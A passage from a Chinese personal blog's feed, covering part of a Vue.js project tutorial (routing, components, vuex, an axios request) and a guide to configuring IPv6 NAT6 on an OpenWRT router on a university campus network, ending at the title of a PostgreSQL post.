</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// 使用vuex插件
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// 渲染页面
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// 绑定到 index.html -&gt; div#app
</span></code></pre></div><p>其中渲染的页面位于 <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue 是vue中的<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">单文件组件</a>，将 <code>html css javascript</code> 集合在同一个文件，便于组织管理</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>其中 <code>是页面的 `html` 元素，`style` 是样式元素，还可以添加一个 `javascript` 为js元素。其中</code> 是路由组件，会被自动渲染成当前路由对应的页面</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>如 <code>http://localhost:8080/</code> 下 <code>被渲染成 `home` 页面，`http://localhost:8080/about` 下</code> 被渲染成 <code>about</code> 页面。</p>
<blockquote>
<p>技巧 这里加载组件使用函数加载，就可以实现懒加载以优化性能。</p>
</blockquote>
<hr>
<p><code>src/views/</code> 则是保存页面文件，例如</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>这就是路由 <code>home</code> 对应的页面，其中用到了 <code>HelloWorld</code> 组件，需要在js中引入。</p>
<hr>
<p><code>src/components/</code> 里面保存可复用的组件，例如上面的 `` 就是一个独立的组件（component）</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>这就是一个典型的组件，结构就是一个正常的单文本组件，说明组件就是把一部分页面逻辑抽出来组成一个文件。这样的好处是分离与页面无关的组件，使页面逻辑更加清晰，同时也便于复用组件。如果有以下情况，我建议把部分代码分离成独立的组件：</p>
<ol>
<li>需要多次复用的组件，如基础按钮、表单等</li>
<li>较为复杂但与页面逻辑无关的，如页面的Header、Footer等</li>
</ol>
<blockquote>
<p>技巧 在 <code>style</code> 表情上添加 <code>scoped</code> 属性可以限制CSS生效范围为该组件，不会影响其他元素，在编译时vue解释器会给这些css属性加上随机的hash保证唯一</p>
</blockquote>
<hr>
<p>vue还提供了一个状态管理模式 <a href="https://vuex.vuejs.org/zh/">vuex</a>，可以很方便的管理所有组件的状态。对应文件 <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>由于我还没用过 <code>vuex</code> 所以自己看文档吧</del></p>
<p>对于简单的应用也可以不用 <code>vuex</code> ，一个简单的 <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> 模式</a> 就足够了</p>
<h1 id="0x4-开发指引">0x4 开发指引</h1>
<p>有了上面的基础，我们就可以开始写代码了，这里以添加一个 <code>Foo</code> 页面展示从远端获得的数据为例</p>
<h2 id="1-给页面添加一个-tab">1. 给页面添加一个 <code>Tab</code></h2>
<p><code>Tab</code> 属于与页面逻辑无关，但又处处要使用的元素，所以我们将其独立成为一个组件</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>在这里我们创建了一个底部导航栏，有三个 <code>Tab</code> ，并且对应跳转到不同的页面</p>
<h2 id="2-创建-foovue-相关逻辑并与后端交互">2. 创建 <code>Foo.vue</code> 相关逻辑并与后端交互</h2>
<p>因为我们需要从远端API获取数据并进行展示，就涉及网络请求。在vue中，官方推荐使用 <a href="https://github.com/axios/axios">axios</a> 发起请求。<code>axios</code> 是一个基于 <code>promise</code> 的异步网络请求库，相关用法可参考文档或网上教程</p>
<p>安装 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>接着在 <code>src/main.js</code> 中加入以下语句启用 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// 把axios添加到原型链
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>现在就可以在vue实例中用 <code>this.$router</code> 来访问路由了</p>
<hr>
<p>接着来创建 <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>具体实现代码里面很清楚了</del> 这个文件的作用就是请求 <code>http://httpbin.org/get</code> 并把结果显示在界面上</p>
<p><strong>注意前后端分离的项目会有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">跨域(CORS)问题</a>，这个问题比较复杂，巨坑，网上也有较多解决的文章<del>咕咕咕</del></strong></p>
<h1 id="0x5-技巧及坑们">0x5 技巧及坑们</h1>
<p>这里介绍一些我写vue项目遇到的坑和使用的技巧</p>
<h2 id="data-methods-computed-props-的区别">data methods computed props 的区别</h2>
<p><del>TODO</del></p>
<p>vue中存储数据有几种方式——data、</p>
<h1 id="0x6-结语">0x6 结语</h1>
<p>到此，一个简单的vue项目就完成了，对于如何组织项目，前后端如何交互应该已经有了初步了解。本文也会持续更新，欢迎关注我的<a href="https://blog.creedowl.com/">blog</a></p>
<p>本文的实例请访问<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[南航校园网OpenWRT配置IPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>当前IPv6越来越流行，不但解决了IPv4地址不够用的问题，还能给接入的设备提供公网访问的支持。但由于校园网的特殊性，虽然很早就有了IPv6支持，大部分学校在IPv6地址分配上却有剧毒，无法向下游设备分配独立的IPv6地址（正常家庭网络环境中路由器及下游设备都能自动分配独立的公网IPv6地址），以南航为例，OpenWRT上虽然获取到了2001开头，/64结尾的公网IPv6地址，但下游设备却无IPv6访问权限。本文介绍南航校园网环境下如何在OpenWRT下获取IPv6并配置NAT6使下游设备拥有IPv6访问权限。</p>
</blockquote>
<h2 id="0软硬件需求">0：软硬件需求</h2>
<p><strong>硬件</strong>：支持OpenWRT固件的路由器或软路由（推荐使用软路由，性能更好，支持启用更多服务，且不需要考虑太多兼容性问题，x86版本OpenWRT一把梭）</p>
<p><strong>软件</strong>：较新版本的OpenWRT或其衍生版本（lede，pandorabox等，但原版OpenWRT最佳）</p>
<p><strong>OpenWRT内核需高于3.7</strong>， linux kernel在3.7版本开始支持NAT6</p>
<p><del>内核版本不够高且无法升级可以尝试早年由北邮大佬开发的NAT66项目，但不推荐</del></p>
<p>所需软件包：</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>较新版本已经自带IPv6支持，老版本需要自己安装相关软件包，但兼容性较差，或者内核版本不足，建议找较新版本或者自行编译。</p>
<h2 id="1openwrt配置获取ipv6">1：OpenWRT配置获取IPv6</h2>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304901671.png/compress" alt="IPv6_setting_1"></p>
<h3 id="1-修改ipv6-ula前缀为fd开头默认为dd开头">1. 修改IPv6 ULA前缀为fd开头（默认为dd开头）</h3>
<h3 id="2-修改wan6口配置如下图所示">2. 修改wan6口配置（如下图所示）</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304939503.png/compress" alt="IPv6_setting_2"></p>
<h3 id="3-修改lan口dhcp服务器配置如下图所示">3. 修改lan口DHCP服务器配置（如下图所示）</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304973656.png/compress" alt="IPv6_setting_3"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304997028.png/compress" alt="IPv6_setting_4"></p>
<p>此时稍等片刻，在概况中应该就能看到获取到的IPv6地址及下游设备DHCPv6分配内网IPv6地址</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305013341.png/compress" alt="IPv6_setting_5"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305030637.png/compress" alt="IPv6_setting_6"></p>
<p>现在你的路由器已经可以使用IPv6了，但下游设备并不行，就需要配置NAT6。</p>
<h2 id="2配置nat6">2：配置NAT6</h2>
<p>虽然NAT6并不符合IPv6的设计哲学，但却能解决一些问题，如安全隔离，或者像我们这样通过单一地址转发给多个设备使用。</p>
<h3 id="1-修改防火墙">1. 修改防火墙</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305046715.png/compress" alt="IPv6_setting_7"></p>
<p>加入以下自定义规则</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>注意这里WAN6和LAN要改为外网IPv6和内网网卡名字，在终端使用ifconfig查看</strong></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305068355.png/compress" alt="IPv6_setting_8"></p>
<h3 id="2-配置网关">2. 配置网关</h3>
<p>在终端执行 <code>ip -6 r</code> 查看默认网关（default开头），如果是类似</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>这样蛋疼的网关，需要去掉<code>from 2001:xxxx:xxxx:xxxx::/64</code> 这段再添加默认网关，例如</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>可以建立一个<code>/etc/hotplug.d/iface/99-ipv6</code>实现自动配置</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>最后别忘了修改权限</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>重启路由器就可以愉快的玩耍了。</p>
<p><del>本来还想折腾IPv6端口转发，但一直无法配置成功。后来突然发现南航校园网下没有对IPv4做严格隔离（除了80端口基本上都能直接访问），就直接做IPv4端口转发配合DDNS，连接校园WIFI（nuaa.portal，<strong>付费版本</strong>）就可以直接使用，速度还挺快。。。就真香了。。不过配置IPv6端口转发还是有意义，比如可以从非校园网访问，校园网访问IPv6无需认证（不要充钱了），相关教程有空再补上（咕咕咕）有需求可以参考<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NAT后配置端口转发</a></del></p>
<h2 id="参考资料">参考资料</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">清华OpenWRT 路由器作为 IPv6 网关的配置</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/postgres-handbook/</id>
        <title><![CDATA[PostgreSQL 简介与常用命令]]></title>
        <updated>2019-02-03T10:32:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/postgres-handbook/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/postgres-handbook/"><![CDATA[<h1 id="postgresql-简介与常用命令">PostgreSQL 简介与常用命令</h1>
